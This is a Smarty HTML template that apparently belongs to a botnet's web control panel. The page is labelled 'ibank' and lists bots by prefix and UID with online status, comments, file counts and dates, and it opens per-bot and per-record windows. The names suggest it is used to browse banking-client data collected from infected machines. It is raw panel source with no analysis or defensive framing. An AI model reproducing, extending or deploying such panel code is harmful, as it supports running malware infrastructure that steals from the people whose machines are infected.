
<div class="top_menu">

<div class="top_menu_left">
<span style="font-size: 22px; color:#CCCCCC">{$lang.ibank}</span>
</div>

<div class="top_menu_right">
{if $_SESSION.user->access.cabs.index eq on}<a href="/cabs/index.html">{$lang.cabs}</a>&nbsp;{/if}
</div>

</div>
<hr />

<form action="#" method="post" enctype="multipart/form-data" name="screens_filter" id="screens_filter">

<div style="text-align: right; padding-right: 10px; padding-left: 10px">

{$lang.pref} (<a onclick="alert('{$lang.zpref}');" style="cursor:pointer">?</a>): <select id="prefix" name="prefix" style="width:600px">
{if $_SESSION.user->config.prefix eq ''}<option value="ALL">{$lang.all}</option>{/if}
{foreach from=$prefix item=pref}
<option value="{$pref}"{if $_SESSION.search.ibank.prefix eq $pref} selected="selected"{/if}>{$pref}</option>
{/foreach}
</select>
<hr />
{$lang.uid} (<a onclick="alert('{$lang.uid_desc}');" style="cursor:pointer">?</a>): <input name="uid" type="text" style="width:600px" value="{$_SESSION.search.ibank.uid}"/>
<hr />
{$lang.date} (<a onclick="alert('{$lang.ddesc}');" style="cursor:pointer">?</a>): <select id="data" name="date" style="width:600px">
<option value="ALL">{$lang.all}</option>
{foreach from=$date item=d}
<option value="{$d->date}"{if $_SESSION.search.ibank.date eq $d->date} selected="selected"{/if}>{$d->date}</option>
{/foreach}
</select>
<hr />
<input type="button" name="update" value="{$lang.upda}" style="width:100%" onclick="return get_hax({ldelim}url: '/cabs/ibank.html?ajax=1',method:'post',id:'content',form:'screens_filter'{rdelim});" />
</div>
</form>

{if $files}
<br />
<div style="font-size:10px; position:relative" align="center">
<div style="position:absolute; left: 0px; top:10px">{$lang.maxstr}: {$_SESSION.user->config.cp.ibnkgra}</div>
&nbsp;{$pages}&nbsp;
<div style="position:absolute; right: 0px; top:10px">{$lang.vsego}: {$counts}</div>
</div>
<br />

<form action="#" name="groups" >

<table cellspacing="1" cellpadding="5" class="t" style="width: 100%; text-align:center; border: 1px solid #cccccc;">
<tr class="t4">
    <td class="bg3" style="width:20%">{$lang.uid}</td>
    <td class="bg3" style="width:15%">{$lang.bot}</td>
    <td class="bg3" style="width:40%">{$lang.comm}</td>
    <td class="bg3" style="width:10%">{$lang.filov}</td>
    <td class="bg3" style="width:15%" title="{$lang.datep}">{$lang.date}</td>
</tr>
{foreach from=$files item=item name=files}
{if $smarty.foreach.files.iteration is not even}{assign var=bg value=2}{else}{assign var=bg value=1}{/if}
<tr class="bg{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="cursor:pointer;">
    <th onclick="get_ibnk_window('{$item->prefix}{$item->uid}');">{$item->prefix}{$item->uid}</th>
    <th {if $online[$item->prefix][$item->uid]}style="background-color:#0F0"{/if}><a onclick="get_bot_window('{$item->prefix}{$item->uid}');">{$lang.show}</a></th>
    <th style="{if $item->comment|strpos:"!" ne 0}color:#F00{/if}" onclick="return false;" id="cg_{$item->prefix}{$item->uid}" ondblclick="edit_comment_ibnk(this, 'groups', '{$item->grp}');">{$item->comment}</th>
    <th style="margin:0px; padding:0px">{$item->count}</th>
    <th onclick="get_ibnk_window('{$item->grp}')">{$item->post_date|date_format:"%d-%m-%Y"}</th>
</tr>
{/foreach}
</table>
<br />

</form>
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>

{/if}